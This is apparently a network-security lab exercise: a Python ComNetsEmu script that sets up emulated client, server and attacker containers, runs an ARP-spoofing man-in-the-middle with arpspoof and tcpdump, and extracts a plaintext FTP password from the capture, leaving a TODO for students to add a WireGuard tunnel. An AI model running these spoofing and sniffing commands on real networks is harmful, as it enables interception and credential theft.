#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

"""
About: Basic example of using Docker as a Mininet host
"""

import comnetsemu.tool as tool
from comnetsemu.net import Containernet
from time import sleep
from mininet.link import TCLink
from mininet.log import info, setLogLevel
from mininet.node import Controller
from mininet.util import dumpNodeConnections

PING_COUNT = 15


def testTopo():
    "Create an empty network and add nodes to it."

    net = Containernet(controller=Controller, link=TCLink)

    info('*** Adding controller\n')
    net.addController('c0')

    info('*** Adding hosts\n')
    client = net.addDockerHost('client', dimage='sec_test', ip='10.0.0.1', cpuset_cpus="1", cpu_quota=25000)
    server = net.addDockerHost('server', dimage='sec_test', ip='10.0.0.2', cpuset_cpus="1", cpu_quota=25000)
    attacker = net.addDockerHost('attacker', dimage='sec_test', ip='10.0.0.3', cpuset_cpus="0", cpu_quota=25000)

    info('*** Adding switch\n')
    s1 = net.addSwitch('s1')

    info('*** Creating links\n')
    net.addLinkNamedIfce(s1, client, bw=10, delay='1ms', use_htb=True)
    net.addLinkNamedIfce(s1, server, bw=10, delay='1ms', use_htb=True)
    net.addLinkNamedIfce(s1, attacker, bw=10, delay='1ms', use_htb=True)

    info('*** Starting network\n')
    net.start()

    info('*** Attacker, Client and Server setup\n')
    client.cmd("ping -c 10 10.0.0.2")
    attacker.cmd("printf -- '#!/bin/bash\narpspoof -i attacker-s1 -t 10.0.0.1 10.0.0.2 >> /dev/null &\narpspoof -i attacker-s1 -t 10.0.0.2 10.0.0.1 >> /dev/null &' > spoof.sh; chmod +x spoof.sh; ./spoof.sh")
    sleep(10)
    attacker.cmd('tcpdump -vvv -i attacker-s1 -B 100000 ip >> messages.log &')
    sleep(10)
    server.cmd("mkdir -p /var/run/vsftpd/empty")
    server.cmd("vsftpd &")

    # TODO: Setup a tunnel to protect the ftp request from the MitM attacker!
    # You can use test_connection to verify that the tunnel was established.
    # Remember that you have to request the file through the tunnel and not via external IP of the server!
    # Generate the keys for wireguard and grep them from the host like this
    # key = client.cmd("cat keyfile").replace('\n', ' ').replace('\r', '')

    test_connection(client, "10.0.0.2")
    login_at_ftp_server(client, "10.0.0.2")

    info('*** Extract Passwords\n')
    sleep(20)
    output = attacker.cmd('cat messages.log')
    password_found = False
    for line in output.split("\n"):
        if "PASS" in line:
            password_found = True
            info('*** Found password: ' + line + '\n')

    if not password_found:
        info('*** No password found!\n')

    info('*** Stopping network\n')
    net.stop()


def login_at_ftp_server(client_container, ftp_server_ip):
    info('*** Login into ftp server\n')
    client_container.cmd("printf -- '#!/bin/bash \n ftp -i -n " + ftp_server_ip + " <<EOF\n user root hunter2 \nEOF\n' > login.sh && chmod +x login.sh && ./login.sh")


def test_connection(source_container, target_ip):
    info("*** Test the connection\n")
    info("* Ping test count: %d" % PING_COUNT)
    ret = source_container.cmd("ping -c " + str(PING_COUNT) + " " + target_ip)
    sent, received = tool.parsePing(ret)
    measured = ((sent - received) / float(sent)) * 100.0
    info("* Measured loss rate: {:.2f}%\n".format(measured))


if __name__ == '__main__':
    setLogLevel('info')
    testTopo()
